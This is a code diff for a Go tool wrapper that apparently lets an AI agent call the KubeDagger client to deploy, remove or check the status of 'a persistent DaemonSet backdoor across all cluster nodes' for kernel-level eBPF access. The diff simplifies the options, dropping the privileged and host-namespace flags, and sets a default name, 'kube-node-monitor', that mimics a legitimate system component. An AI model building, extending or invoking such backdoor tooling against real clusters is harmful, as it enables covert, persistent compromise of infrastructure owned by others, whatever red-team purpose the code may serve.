@@ -11,13 +11,9 @@ import (
 )
 
 type DaemonsetInput struct {
-	Action    string `json:"action"`
-	Name      string `json:"name,omitempty"`
-	Namespace string `json:"namespace,omitempty"`
-	Image     string `json:"image,omitempty"`
-	Privileged bool  `json:"privileged,omitempty"`
-	HostPID   bool   `json:"host_pid,omitempty"`
-	HostNet   bool   `json:"host_network,omitempty"`
+	Action string `json:"action,omitempty"`
+	Image  string `json:"image,omitempty"`
+	Name   string `json:"name,omitempty"`
 }
 
 type DaemonsetTool struct {
@@ -31,7 +27,7 @@ func NewDaemonset(exec executor.Executor) *DaemonsetTool {
 func (t *DaemonsetTool) Name() string { return "kubedagger_daemonset" }
 
 func (t *DaemonsetTool) Description() string {
-	return "Deploy, remove, or check status of a persistent DaemonSet backdoor across all cluster nodes. Runs with elevated privileges to maintain kernel-level access via eBPF programs on every node."
+	return "Deploy, remove, or check status of a persistent DaemonSet backdoor across all cluster nodes. Runs on every node to maintain kernel-level access via eBPF programs."
 }
 
 func (t *DaemonsetTool) InputSchema() json.RawMessage {
@@ -41,34 +37,17 @@ func (t *DaemonsetTool) InputSchema() json.RawMessage {
 			"action": {
 				"type": "string",
 				"enum": ["deploy", "remove", "status"],
-				"description": "DaemonSet action"
-			},
-			"name": {
-				"type": "string",
-				"description": "DaemonSet name (default: system-node-monitor)"
-			},
-			"namespace": {
-				"type": "string",
-				"description": "Namespace to deploy in (default: kube-system)"
+				"description": "DaemonSet action (default: deploy)"
 			},
 			"image": {
 				"type": "string",
-				"description": "Container image to use"
+				"description": "Container image to use for the DaemonSet"
 			},
-			"privileged": {
-				"type": "boolean",
-				"description": "Run in privileged mode"
-			},
-			"host_pid": {
-				"type": "boolean",
-				"description": "Share host PID namespace"
-			},
-			"host_network": {
-				"type": "boolean",
-				"description": "Use host network"
+			"name": {
+				"type": "string",
+				"description": "DaemonSet name (default: kube-node-monitor)"
 			}
-		},
-		"required": ["action"]
+		}
 	}`)
 }
 
@@ -78,34 +57,22 @@ func (t *DaemonsetTool) Execute(ctx context.Context, params json.RawMessage) (*m
 		return errorResult("invalid input: " + err.Error()), nil
 	}
 
-	if err := validateNamespace(input.Namespace); err != nil {
+	if err := validateSafeString(input.Image, "image"); err != nil {
 		return errorResult(err.Error()), nil
 	}
 	if err := validateSafeString(input.Name, "name"); err != nil {
 		return errorResult(err.Error()), nil
 	}
-	if err := validateSafeString(input.Image, "image"); err != nil {
-		return errorResult(err.Error()), nil
-	}
 
-	args := []string{"daemonset", input.Action}
-	if input.Name != "" {
-		args = append(args, "--name", input.Name)
-	}
-	if input.Namespace != "" {
-		args = append(args, "--namespace", input.Namespace)
+	args := []string{"daemonset"}
+	if input.Action != "" {
+		args = append(args, "--action", input.Action)
 	}
 	if input.Image != "" {
 		args = append(args, "--image", input.Image)
 	}
-	if input.Privileged {
-		args = append(args, "--privileged")
-	}
-	if input.HostPID {
-		args = append(args, "--host-pid")
-	}
-	if input.HostNet {
-		args = append(args, "--host-network")
+	if input.Name != "" {
+		args = append(args, "--name", input.Name)
 	}
 
 	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
@@ -119,7 +86,11 @@ func (t *DaemonsetTool) Execute(ctx context.Context, params json.RawMessage) (*m
 
 	output := strings.TrimSpace(string(result.Stdout))
 	var sb strings.Builder
-	fmt.Fprintf(&sb, "## KubeDagger DaemonSet: %s\n\n", input.Action)
+	action := input.Action
+	if action == "" {
+		action = "deploy"
+	}
+	fmt.Fprintf(&sb, "## KubeDagger DaemonSet: %s\n\n", action)
 	if output == "" {
 		sb.WriteString("Operation complete.\n")
 	} else {
